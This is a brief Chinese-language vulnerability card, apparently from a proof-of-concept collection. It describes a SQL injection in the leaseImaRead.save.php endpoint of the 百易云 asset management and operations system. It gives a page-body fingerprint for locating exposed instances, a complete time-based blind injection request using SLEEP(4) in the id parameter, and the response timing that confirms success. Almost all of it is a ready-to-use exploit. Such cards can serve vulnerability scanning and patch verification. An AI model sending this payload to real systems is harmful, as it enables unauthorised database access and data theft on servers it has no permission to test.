# 百易云资产管理运营系统leaseImaRead存在SQL注入漏洞

百易云资产管理运营系统 ｜ SQL注入 ｜ —
- **指纹**：`body="不要着急，点此"`
- **请求**：`GET /adminx/leaseImaRead.save.php?act=makeToFee&id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(4)))OKTO) HTTP/1.1`
- **响应特征**：200 响应时间>=4s